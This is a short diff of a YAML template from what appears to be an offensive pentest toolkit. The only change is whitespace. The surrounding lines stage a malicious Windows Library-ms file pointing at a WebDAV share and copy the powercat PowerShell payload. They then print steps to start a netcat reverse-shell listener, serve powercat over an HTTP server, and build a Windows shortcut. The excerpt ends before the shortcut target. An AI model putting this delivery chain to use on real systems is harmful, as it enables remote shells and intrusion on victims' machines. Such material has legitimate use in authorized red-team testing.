@@ -28,7 +28,7 @@ content: |
   </libraryDescription>
   ' > packstation/outbound/webdav/config.Library-ms; \
   cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound/;
-  
+
   echo "1. Start a revshell listener: <%echo $(esh scripts/listener-nc)%>"; \
   echo "2. Start a webserver for powercat: python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound"; \
   echo "3. Using windows, create a shortcut file with the following target: "; \
